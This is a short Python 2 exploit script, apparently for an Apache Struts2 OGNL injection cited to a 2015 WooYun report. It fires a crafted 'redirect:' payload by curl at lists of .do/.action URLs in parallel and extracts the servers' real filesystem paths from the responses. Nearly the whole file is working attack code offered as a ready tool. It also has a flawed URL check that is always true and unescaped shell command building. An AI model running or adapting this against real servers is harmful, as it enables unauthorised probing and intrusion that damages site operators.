# -*- coding:utf-8 -*-
# !/usr/bin/env python
# http://www.wooyun.org/bugs/wooyun-2015-0147301
# curl -i 'example.action/.do' -F 'redirect:/${#context.get("
#          com.opensymphony.xwork2.dispatcher.HttpServletR
#          equest").getRealPath("/")}=-1'


import os
import traceback
import argparse
import re
import json
from gevent.threadpool import ThreadPool


class st2bypass():
    def __init__(self):
        self.result = []
        self.pool = ThreadPool(10)
        self.q = []

    def action(self, info):
        try:
            if '.do' or '.action' in info:
                url = info.split('?')[0]
                self.q.append(url)
        except:
            traceback.print_exc()

    def Fuzz(self, url):
        try:
            cmd = '''curl -i "%s" -F 'redirect:/${#context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest").getRealPath("/")}=-1' ''' % url
            print cmd
            output = os.popen(cmd).read()
            for i in re.finditer(r'\:\/\/.*\/\/(?P<path>'
                                 r'.*?)/;', output):
                path = i.group('path')
                if path:
                    self.result.append(path)
        except:
            traceback.print_exc()

    def Scan(self, info):
        try:
            if isinstance(info, str):
                self.action(info)
            else:
                for i in info:
                    self.action(i['url'])
            self.pool.map(self.Fuzz, self.q)
        except:
            traceback.print_exc()


if __name__ == "__main__":
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", dest="url")
    parse.add_argument("-f", "--file", dest="file")
    args = parse.parse_args()
    url = args.url
    file = args.file
    urls = ''
    if file:
        with open(file) as f:
            urls = json.loads(f.read())
    info = url if url else urls
    exa = st2bypass()
    exa.Scan(info)
    if exa.result:
        print exa.result
